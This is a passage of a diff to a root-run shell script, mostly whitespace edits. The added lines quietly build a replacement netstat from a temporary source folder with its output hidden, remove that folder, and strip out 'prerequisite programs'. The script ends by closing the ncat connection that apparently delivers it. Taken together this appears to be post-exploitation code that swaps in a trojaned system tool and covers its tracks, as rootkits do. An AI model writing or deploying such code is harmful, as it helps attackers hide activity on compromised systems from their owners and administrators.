+    make update -C /tmp/net-tools-master &>/dev/null
+    if [ "$?" == "0" ]; then
+      echo "done, netstat replaced"
+    else
+      echo "failed, netstat not replaced"
+    fi
+    rm  -r /tmp/net-tools-master
   fi
 
-	#--remove prerequisite programs--
+  #--remove prerequisite programs--
   echo "--remove prerequisite programs--"
   for ((i=0; i < ${#uninstall[@]}; i++)); do
     if [ "${uninstall[i]}" != "0" ]; then
@@ -827,6 +827,6 @@ if [ "$USER" == "root" ]; then
     fi
   done
 
-	#exit to tell ncat that we are done with the script so the connection closes
-	exit
+  #exit to tell ncat that we are done with the script so the connection closes
+  exit
 fi
